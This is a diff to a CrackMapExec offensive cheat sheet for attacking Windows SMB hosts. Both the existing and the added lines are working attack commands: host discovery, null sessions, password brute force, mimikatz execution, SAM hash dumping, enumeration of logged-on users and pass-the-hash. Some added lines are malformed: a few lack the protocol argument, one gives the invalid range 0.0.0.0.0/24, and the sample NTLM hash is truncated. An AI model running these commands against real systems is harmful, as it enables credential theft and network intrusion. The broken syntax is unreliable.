@@ -1,6 +1,9 @@
 [Host discover]
 crackmapexec smb 192.168.1.1/24
 
+[Null sessions]
+crackmapexec smb <target(s)> -u '' -p ''
+
 [Brute force]
 crackmapexec smb 192.168.1.1/24 -u Admin -p Pass123 
 
@@ -14,7 +17,19 @@ crackmapexec smb 192.168.1.1/24 -u Administrator -p Password1 -M mimikatz
 crackmapexec smb 10.10.10.100 -u user -H [hash-ntlm]
 
 [Dump sam]
-crackmapexec smb 10.10.10.100 -u user -p password --sam
+crackmapexec smb 0.0.0.0 -u user -p password --sam
+
+[Logged users]
+crackmapexec 0.0.0.0 -u 'Administrator' -p 'password' --lusers
+
+[Local auth]
+crackmapexec 0.0.0.0 -u 'Administrator' -p 'password' --local-auth
+
+[Dump local sam hash]
+crackmapexec 0.0.0.0 -u 'Administrator' -p 'password' --local-auth --sam
+
+[Pass the hash with local auth]
+crackmapexec smb 0.0.0.0.0/24 -u administrator -H 'aad3b435b51404eeaa35b51404ee:5509de4fa6e8d9f4a61100e51' --local-auth
 
 
 
